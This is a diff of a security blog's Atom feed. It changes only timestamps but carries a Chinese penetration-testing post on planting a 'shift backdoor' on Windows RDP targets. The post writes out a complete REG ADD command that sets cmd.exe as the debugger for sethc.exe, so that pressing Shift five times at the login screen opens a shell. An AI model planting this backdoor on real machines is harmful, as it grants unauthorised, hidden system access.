@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://ak47-sec.com/"/>
-  <updated>2018-03-21T02:51:23.196Z</updated>
+  <updated>2018-05-01T06:58:51.029Z</updated>
   <id>http://ak47-sec.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://ak47-sec.com/2018/03/21/shift%E5%90%8E%E9%97%A8%E5%A6%99%E7%94%A8/"/>
     <id>http://ak47-sec.com/2018/03/21/shift后门妙用/</id>
     <published>2018-03-21T02:06:01.000Z</published>
-    <updated>2018-03-21T02:51:23.196Z</updated>
+    <updated>2018-05-01T06:58:51.029Z</updated>
     
     <content type="html"><![CDATA[<p><body onload="prettyPrint()"></body></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。对于非服务器版本的Windows系统默认只允许一个账户登录。</p><h2 id="表现形式"><a href="#表现形式" class="headerlink" title="表现形式:"></a>表现形式:</h2><blockquote><p>远程登录时使用与原系统相同的账户，原系统将被切换到登录界面(当前用户会被挤掉线)</p></blockquote><p><img src="3-1.jpg" alt="3-1"></p><blockquote><p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图:</p></blockquote><p><img src="3-2.jpg" alt="3-2"></p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>向目标机器植入shift后门，连接成功后5下shift便可弹出cmd shell。命令如下(无需换行)：</p><pre class="prettyprint linenums">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f</pre><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>连接后5下shift，截图如下:</p><p><img src="3-3.jpg" alt="3-3"></p>]]></content>
     
